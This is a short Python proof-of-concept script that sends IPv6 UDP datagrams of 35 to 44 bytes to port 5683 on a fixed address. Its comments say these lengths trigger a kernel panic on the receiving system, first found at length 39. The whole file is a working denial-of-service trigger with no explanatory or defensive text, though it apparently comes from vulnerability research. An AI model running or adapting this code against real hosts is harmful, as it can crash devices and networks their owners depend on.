import ctypes
import socket

__author__ = 'David Palma'
__version__ = "0.1"

client = None
mysocket=""

#main
server = ('b:1::2', 5683)

mysocket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#the kernel panic occurs between these values
#first discovered for a length of 39
for i in range(35,45):
    datagram = ctypes.create_string_buffer(i*"-")
    #print "current length: ", i
    #datagram = ctypes.create_string_buffer(39)
    #print ctypes.sizeof(datagram), repr(datagram.raw)
    mysocket.sendto(datagram, server)


